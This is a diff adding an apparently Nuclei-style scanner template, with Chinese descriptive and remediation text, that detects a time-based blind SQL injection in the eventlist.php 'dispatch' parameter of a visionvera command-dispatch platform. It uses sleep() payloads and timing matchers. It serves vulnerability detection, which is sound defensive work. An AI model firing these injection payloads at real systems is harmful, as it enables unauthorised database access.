@@ -1,0 +1,53 @@
+id: visionvera-zhihuidiaodu-eventlist-php-injection
+
+info:
+  name: visionvera zhihuidiaodu eventlist.php 注入
+  author: bl
+  severity: high
+  tags: 指挥调度管理平台
+  description: |-
+    本模板用于检测 visionvera zhihuidiaodu 组件中 eventlist.php 接口存在的 SQL 注入漏洞。
+    攻击者可向受影响端点提交特制输入，干扰数据库查询逻辑，可能导致未授权读取或修改数据。实际影响取决于目标版本、配置及端点暴露程度。
+  remediation: >-
+    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
+  
+variables:
+  sleepSecond1: '{{rand_int(6, 8)}}'
+  sleepSecond2: '{{rand_int(3, 5)}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/custom/zx/event/eventlist.php?dispatch=1%27%20and%20(select%201228%20from%20(select(sleep(0)))plll)%20and%20%27swnj%27%3d%27swnj'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        words:
+          - "successed"
+        part: body
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/custom/zx/event/eventlist.php?dispatch=1%27%20and%20(select%201228%20from%20(select(sleep({{sleepSecond1}})))plll)%20and%20%27swnj%27%3d%27swnj'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration - duration_1 >= sleepSecond1 * 1 - 1
+        condition: and
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/custom/zx/event/eventlist.php?dispatch=1%27%20and%20(select%201228%20from%20(select(sleep({{sleepSecond2}})))plll)%20and%20%27swnj%27%3d%27swnj'
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration - duration_1 >= sleepSecond2 * 1 - 1
+        condition: and
